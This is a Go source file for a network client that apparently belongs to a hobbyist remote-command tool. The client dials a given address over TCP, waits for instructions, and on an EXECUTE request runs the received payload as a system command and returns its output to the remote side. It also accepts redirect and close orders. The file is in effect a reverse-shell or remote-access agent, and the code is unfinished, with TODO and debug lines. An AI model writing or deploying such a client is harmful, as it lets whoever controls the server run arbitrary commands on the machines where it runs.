package client

import (
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	. "../network"
)

// ============================Exportables==========================

type Client struct {
	Conn net.Conn
}

// Not sure if this is a good idea
func NewClient(addr, port string) (Client, error) {
	addrWithPort := addr + ":" + port
	conn, err := net.Dial("tcp", addrWithPort)

	return Client{Conn: conn}, err
}

func (client *Client) Communicate() {
	defer client.tryNotifyAndClose()
	defer println("Works")               // DEBUG
	client.Conn.SetDeadline(time.Time{}) // This returns an error but idk what to do with it
	go client.handleReceives()

	// Prevents the process from exiting right away
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sig
}

// ==============================Internals============================

func (client *Client) handleReceives() {
	buffer := make([]byte, 1024)

	for {
		n, err := client.Conn.Read(buffer)

		switch err {
		case net.ErrClosed:
			// TODO (idk what to do)
			continue
		}

		receivedReq := ParseIntoRequest(buffer[:n])
		client.processRequestAndSendResponse(receivedReq)
	}
}

func (client *Client) processRequestAndSendResponse(req Request) {
	switch req.Status {
	case PING:
		// TODO
	case REQUESTING_CLOSE:
		os.Exit(0)
	case REDIRECT:
		// TODO
		// Maybe freeze all goroutines till it redirects successfully
	case EXECUTE:
		rawCommand := strings.TrimSuffix(req.Payload, "\n")
		command, params := parseIntoCommandAndParams(rawCommand)
		out, err := exec.Command(command, params...).Output()

		if err != nil {
			client.send(OUTPUT_WITH_ERROR, out)
		} else {
			client.send(OUTPUT, out)
		}
	}
}

func (client *Client) send(
	statusCode StatusCode,
	bytes []byte,
) error {
	payload := []byte{statusCode}
	payload = append(payload, bytes...)

	if _, err := client.Conn.Write(payload); err != nil {
		// TODO (idk what to do)
	}

	return nil
}

func (client *Client) tryNotifyAndClose() {
	client.Conn.Write([]byte{REQUESTING_CLOSE})
	os.Exit(0)
}
